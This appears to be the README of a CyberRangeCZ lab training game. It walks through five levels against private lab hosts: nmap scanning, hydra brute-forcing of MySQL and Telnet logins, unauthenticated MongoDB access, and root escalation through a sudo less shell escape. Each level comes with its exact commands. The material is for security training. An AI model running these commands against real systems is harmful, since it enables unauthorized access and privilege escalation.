# CyberRangeCZ Platform Demo Training



Follow [general instructions](https://docs.platform.cyberrange.cz/basic-concepts/typical-training-workflow/training-workflow-cloud/) to set up the game.

## Game Levels Summary

### Level 1 — Network Reconnaissance
- Use `nmap` on the Kali machine to scan `db-server` (192.168.40.5)
- Discover open ports: **3306** (MySQL) and **27017** (MongoDB)
- Command: `nmap -sV -p 3306,27017 192.168.40.5`

### Level 2 — MySQL Password Brute-Force
- Use `hydra` to brute-force the MySQL service on `db-server`
- Wordlist is available at `/usr/share/wordlists/rockyou.txt`
- Command: `hydra -l dbuser -P /usr/share/wordlists/rockyou.txt mysql://192.168.40.5`
- Once credentials are found, connect manually:
  `mysql -h 192.168.40.5 -u dbuser -p`
- Retrieve the flag: `USE company; SELECT * FROM employees;`

### Level 3 — MongoDB Unauthenticated Access
- Connect to MongoDB directly — no credentials required (misconfiguration)
- Command: `mongosh --host 192.168.40.5 --port 27017`
- Retrieve the flag: `use records` → `db.flags.find()`

### Level 4 — Telnet Password Guessing
- Use `hydra` to brute-force the Telnet service on `server` (192.168.20.5, port 2323)
- Command: `hydra -l alice -P /home/kali/passlist.txt telnet://192.168.20.5 -s 2323`
- Log in via Telnet: `telnet 192.168.20.5 2323`

### Level 5 — Privilege Escalation via Misconfigured sudo
- Once logged in as `alice` on the Telnet server, read the user flag:
  `sudo less /home/alice/flag.txt`
- Escalate to root using `less` shell escape: press `v`, then run `!/bin/bash`
- Read the root flag: `cat /root/flag.txt`

---

## Topology Summary

| Host         | Image                  | Flavor          | IP             | Network       |
|--------------|------------------------|-----------------|----------------|---------------|
| server       | ubuntu-noble-x86_64    | standard.small  | 192.168.20.5   | server-switch |
| windows-host | Windows-Server-2022    | standard.medium | 192.168.30.5   | client-switch |
| db-server    | ubuntu-noble-x86_64    | standard.medium | 192.168.40.5   | db-switch     |
| kali         | kali-linux-x86_64      | standard.medium | 192.168.30.10  | client-switch |
| router       | debian-12-x86_64       | standard.small  | 192.168.20.1 / 192.168.30.1 / 192.168.40.1 | all networks |

### Network Layout
```
Kali (192.168.30.10) ──► router ──► server (192.168.20.5)   [Telnet :2323]
                                └──► db-server (192.168.40.5) [MySQL :3306, MongoDB :27017]
```

---

## License and Credits
[MIT License](./LICENSE)

**Leading author:** Zeeshan

**Contributors:** Zeeshan khan